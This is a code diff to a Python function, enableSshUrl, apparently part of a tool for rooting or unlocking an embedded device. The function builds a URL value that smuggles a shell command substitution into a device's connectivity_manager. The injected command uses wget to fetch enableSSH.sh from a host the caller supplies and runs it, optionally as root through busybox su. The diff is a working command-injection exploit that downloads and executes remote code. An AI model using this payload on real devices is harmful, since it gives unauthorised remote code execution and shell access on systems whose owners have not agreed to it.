@@ -58,15 +58,18 @@ def runAsRoot(cmd: str, file:str="I"):
 
 
 def enableSshUrl(host: str, port: int = 8899, beacon_port: int = 8883,
-                 busybox: str = "/bin/busybox") -> str:
+                 busybox: str = "/bin/busybox", use_su: bool = False) -> str:
     """Build the sdiscUrl payload that makes connectivity_manager fetch and run
-    enableSSH.sh as root (busybox is setuid and allowed for the apps user).
+    enableSSH.sh.
 
-    The whole payload must stay within SDISCURL_MAX_BYTES.
+    use_su wraps the command in ``busybox su -c`` so it runs as root. That needs
+    a setuid busybox, which the examined firmware image does not show, so the
+    default fetches and runs as the connectivity user (``apps``) instead.
     """
-    remote = (f"wget -qO/tmp/e http://{host}:{port}/enableSSH.sh;"
-              f"sh /tmp/e {host} {port} {beacon_port}")
-    url = f"https://$({busybox} su -c '{remote}')"
+    fetch = (f"wget -qO/tmp/e http://{host}:{port}/enableSSH.sh;"
+             f"sh /tmp/e {host} {port} {beacon_port}")
+    inner = f"{busybox} su -c '{fetch}'" if use_su else fetch
+    url = f"https://$({inner})"
     if len(url.encode()) > SDISCURL_MAX_BYTES:
         raise ValueError(f"payload is {len(url.encode())} bytes, max {SDISCURL_MAX_BYTES}")
     return url
